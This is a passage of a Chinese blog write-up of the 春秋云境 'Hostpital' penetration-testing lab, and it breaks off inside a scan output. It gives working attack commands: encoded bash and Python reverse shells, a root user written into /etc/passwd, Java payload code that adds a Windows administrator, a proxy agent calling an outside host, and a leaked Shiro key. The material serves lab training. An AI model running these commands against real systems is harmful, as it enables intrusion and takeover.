@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="外网打点发现网页  dirsearch扫描 1python3 dirsearch.py -u http:&#x2F;&#x2F;39.99.138.184:8080&#x2F;   发现内存泄漏，dump下来 1java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump  找到shiro的key  1234&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Hostpital">
+<meta property="og:url" content="https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="外网打点发现网页  dirsearch扫描 1python3 dirsearch.py -u http:&#x2F;&#x2F;39.99.138.184:8080&#x2F;   发现内存泄漏，dump下来 1java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump  找到shiro的key  1234&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506535224-058b8b94-639d-4e3b-9411-b6ac1b340566.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506304278-680dd407-b95f-4ad0-9c6f-7f702d2701c8.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506431241-6b9a66a0-c9bb-491a-93bd-6a2b54efa2dc.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506596467-5cf0c16c-a23c-464c-a6fb-9a9c11fd8a94.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506691266-06c309f6-7c64-47fc-9249-f3ef31b44644.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506765818-d9b07ec8-c1fe-4707-b162-68e6bcb817e9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507324978-a395d97c-8870-434c-bff6-2f620761c70a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507507340-8e9d1a33-4465-4c09-ab65-b27204494342.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741508858125-135e632e-81de-4335-9861-afe913f7ac34.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741509092189-98cb4a84-cf46-475a-82c9-666033e5774e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511176747-10e5f640-870b-473b-a69d-9f1d337075ba.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511117703-66983aab-acfc-4be6-8e45-bb5a4e6124ae.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511291364-f25695fa-d904-4219-ab0e-5619ccab7ae4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511420650-813cbb3e-c47f-421d-a41f-a3f3e2c8c198.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512111720-f618bb88-0d56-4f9e-9d19-e4751906f303.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512663079-90c9d474-3a14-413a-848d-bd8ca3611d5a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512702730-917c9d2c-a0e3-48af-84b6-5850d339c4cb.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512776396-bc17183f-7966-435d-aa39-f6a2b8f0762a.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513284749-c586e943-ac7a-4754-bd7d-3853c937080e.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513348548-c92fac68-2133-4a97-8f74-da7b94412a63.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741514668214-ec63b5d8-59f0-4ee4-83de-5840822a6ff4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741515357560-ba0ada9c-6228-47e1-88ed-65bd40881103.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741516243511-ada298db-5454-4344-a318-c853060c4dc6.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518279218-e364ec43-8c0f-49b8-8f23-d5229211383b.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518343735-e4f11c3e-e212-4173-b43b-7a24f2ca8413.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518546759-8fd9bc77-fe72-4a2a-9946-7216fb25a4d5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518673541-e320aa21-91d3-481f-9862-5ba4f16cb34f.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741518779730-556b281a-3255-4637-8203-e17cb4fee4fc.png">
+<meta property="article:published_time" content="2025-03-09T08:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-10T08:22:08.772Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506535224-058b8b94-639d-4e3b-9411-b6ac1b340566.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Hostpital</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/08/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Tsclient/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&text=春秋云境-Hostpital"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&is_video=false&description=春秋云境-Hostpital"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Hostpital&body=Check out this article: https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&title=春秋云境-Hostpital"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&name=春秋云境-Hostpital&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/09/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-hostpital/&t=春秋云境-Hostpital"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">fastjson漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">数据库提权</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Hostpital
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-09T08:51:29.000Z" class="dt-published" itemprop="datePublished">2025-03-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>发现网页</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506535224-058b8b94-639d-4e3b-9411-b6ac1b340566.png"></p>
+<p>dirsearch扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.99.138.184:8080/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506304278-680dd407-b95f-4ad0-9c6f-7f702d2701c8.png"></p>
+<p>发现内存泄漏，dump下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump</span><br></pre></td></tr></table></figure>
+
+<p>找到shiro的key</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506431241-6b9a66a0-c9bb-491a-93bd-6a2b54efa2dc.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure>
+
+<p>找shiro框架利用工具</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506596467-5cf0c16c-a23c-464c-a6fb-9a9c11fd8a94.png"></p>
+<p>可以看到低权限</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506691266-06c309f6-7c64-47fc-9249-f3ef31b44644.png"></p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741506765818-d9b07ec8-c1fe-4707-b162-68e6bcb817e9.png"></p>
+<p>使用vim提权查看文件，此时必须有交互式shell才能查看，方便利用弹个shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eC8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /root/flag/flag01.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507324978-a395d97c-8870-434c-bff6-2f620761c70a.png"></p>
+<p>传个fscan扫一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741507507340-8e9d1a33-4465-4c09-ab65-b27204494342.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.12.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.30.12.5     is alive</span><br><span class="line">(icmp) Target 172.30.12.6     is alive</span><br><span class="line">(icmp) Target 172.30.12.236   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">172.30.12.236:8080 open</span><br><span class="line">172.30.12.5:8080 open</span><br><span class="line">172.30.12.6:445 open</span><br><span class="line">172.30.12.6:139 open</span><br><span class="line">172.30.12.6:135 open</span><br><span class="line">172.30.12.236:22 open</span><br><span class="line">172.30.12.5:22 open</span><br><span class="line">172.30.12.6:8848 open</span><br><span class="line">172.30.12.236:8009 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.30.12.6</span><br><span class="line">   [-&gt;]Server02</span><br><span class="line">   [-&gt;]172.30.12.6</span><br><span class="line">[*] NetBios 172.30.12.6     WORKGROUP\SERVER02            </span><br><span class="line">[*] WebTitle http://172.30.12.5:8080   code:302 len:0      title:None 跳转url: http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529</span><br><span class="line">[*] WebTitle http://172.30.12.5:8080/login;jsessionid=719C12ACB9D4C848919679B06AB55529 code:200 len:2005   title:医疗管理后台</span><br><span class="line">[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台</span><br><span class="line">[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found</span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos </span><br><span class="line">[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass </span><br><span class="line">[+] PocScan http://172.30.12.5:8080 poc-yaml-spring-actuator-heapdump-file </span><br></pre></td></tr></table></figure>
+
+<p>当前权限太低了，这边写个公钥提升到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim.basic /etc/passwd                                       </span><br><span class="line">i                                                           </span><br><span class="line">hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash  #创建用户hacker/123456  </span><br><span class="line">wq!                                                        </span><br><span class="line">su hacker</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741508858125-135e632e-81de-4335-9861-afe913f7ac34.png"></p>
+<p>扫出来内网是nacos，可以打SnakeYaml，把AwesomeScriptEngineFactory.java里执行的命令改成加个管理员用户</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;net user calmsec qwer1234! /add&quot;);</span><br><span class="line">Runtime.getRuntime().exec(&quot;net localgroup administrators calmsec /add&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741509092189-98cb4a84-cf46-475a-82c9-666033e5774e.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p>然后把编译好的jar包传到被控机器的tmp目录下，之后在被控机器上搭建代理(注意后台启动)，再起python服务，让内网的16去访问15的jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./linux_x64_agent -c 1.92.148.33:61032 -s aab32 &amp; </span><br></pre></td></tr></table></figure>
+
+<p>被控机80起个服务</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511176747-10e5f640-870b-473b-a69d-9f1d337075ba.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511117703-66983aab-acfc-4be6-8e45-bb5a4e6124ae.png"></p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511291364-f25695fa-d904-4219-ab0e-5619ccab7ae4.png"></p>
+<p>成功的话就可以直接rdp上去了</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741511420650-813cbb3e-c47f-421d-a41f-a3f3e2c8c198.png"></p>
+<p>之后再看一下236的8080端口,burp抓一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512111720-f618bb88-0d56-4f9e-9d19-e4751906f303.png"></p>
+<h2 id="fastjson漏洞利用"><a href="#fastjson漏洞利用" class="headerlink" title="fastjson漏洞利用"></a>fastjson漏洞利用</h2><p>发现json，猜测fastjson，测试了一下</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512663079-90c9d474-3a14-413a-848d-bd8ca3611d5a.png"></p>
+<p>拿到flag3</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512702730-917c9d2c-a0e3-48af-84b6-5850d339c4cb.png"></p>
+<p>继续用插件注入🐎</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741512776396-bc17183f-7966-435d-aa39-f6a2b8f0762a.png"></p>
+<p>上哥斯拉</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513284749-c586e943-ac7a-4754-bd7d-3853c937080e.png"></p>
+<p>发现54网段</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741513348548-c92fac68-2133-4a97-8f74-da7b94412a63.png"></p>
+<p>弹shell到入口机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.30.12.5&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>再搭一次代理,传fscan</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.30.54.179/24  </span><br><span class="line">  </span><br><span class="line">   ___                              _  </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __  </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /  </span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\  </span><br><span class="line">                     fscan version: 1.8.3  </span><br><span class="line">start infoscan  </span><br><span class="line">(icmp) Target 172.30.54.179   is alive  </span><br><span class="line">(icmp) Target 172.30.54.12    is alive  </span><br><span class="line">[*] Icmp alive hosts len is: 2  </span><br><span class="line">172.30.54.179:8080 open  </span><br><span class="line">172.30.54.12:22 open  </span><br><span class="line">172.30.54.179:22 open  </span><br><span class="line">172.30.54.12:5432 open  </span><br><span class="line">172.30.54.12:3000 open  </span><br><span class="line">172.30.54.179:8009 open  </span><br><span class="line">[*] alive ports len is: 6  </span><br><span class="line">start vulscan  </span><br><span 